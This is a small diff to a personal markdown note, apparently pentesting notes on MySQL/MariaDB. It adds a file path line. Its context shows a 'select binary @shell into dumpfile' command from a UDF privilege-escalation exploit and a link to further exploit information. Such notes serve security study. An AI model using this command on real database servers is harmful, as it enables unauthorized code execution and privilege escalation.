@@ -8,6 +8,8 @@ select binary @shell into dumpfile '/path/to/file/file.so';
 ```
 additional UDF exploit info: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library
 
+` zet/20221003151233/README.md `
+
 # Related
 
 - [20221003151236](/zet/20221003151236/README.md) mysql mariadb
